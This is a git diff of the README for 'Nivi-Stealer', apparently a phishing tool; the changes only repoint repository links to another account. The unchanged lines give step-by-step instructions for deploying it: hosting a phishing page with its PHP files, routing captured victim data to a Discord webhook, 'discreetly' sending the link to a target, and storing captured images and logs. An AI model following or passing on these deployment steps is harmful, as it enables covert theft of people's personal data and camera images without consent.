@@ -28,11 +28,11 @@ Nivi-Stealer brings a range of advanced features to the table, empowering users 
 
 ### Method 0: Cloud-Based Execution with repl.it
 
-[![Run on Repl.it](https://repl.it/badge/github/swagkarna/Nivistealer)](https://repl.it/github/swagkarna/Nivistealer)
+[![Run on Repl.it](https://repl.it/badge/github/tanm-sys/Nivistealer)](https://repl.it/github/tanm-sys/Nivistealer)
 
 - Click the button above or [this link](https://repl.it/github/swagkarna/Nivistealer) to execute Nivi-Stealer on repl.it.
 - Login or sign up on [repl.it](https://repl.it).
-- After cloning the repository, customize the tool by editing [this line](https://github.com/swagkarna/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185) with your repl URL.
+- After cloning the repository, customize the tool by editing [this line](https://github.com/tanm-sys/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185) with your repl URL.
 - Initiate the tool by clicking "Run."
 
 ### Method 1: Host Your Own Phishing Site
@@ -40,7 +40,7 @@ Nivi-Stealer brings a range of advanced features to the table, empowering users 
 - Clone or download this repository.
 - Register an account on a web hosting platform offering SSL support (e.g., [000webhost.com](https://www.000webhost.com/)).
 - Upload `index.html`, `sunni.php`, and `post.php` to your web hosting server.
-- Secure your logs by replacing [this link](https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80) with your Discord webhook URL in `index.html`.
+- Secure your logs by replacing [this link](https://github.com/tanm-sys/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80) with your Discord webhook URL in `index.html`.
 - Discreetly distribute the phishing link to your target. Captured data will be sent to your Discord webhook and saved to `sensitiveinfo.txt`.
 
 ### Method 2: Local Execution
@@ -49,7 +49,7 @@ Nivi-Stealer brings a range of advanced features to the table, empowering users 
 - Install the necessary Python packages in your terminal with these commands:
  pip3 install colorama
  pip3 install flask
-- Customize the tool by editing [this line](https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/python_flask/index.html#L142) with your URL.
+- Customize the tool by editing [this line](https://github.com/tanm-sys/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/python_flask/index.html#L142) with your URL.
 - Execute Nivi-Stealer with the command:
  python nivistealer.py
 - Captured images and logs will be stored locally in your directory.
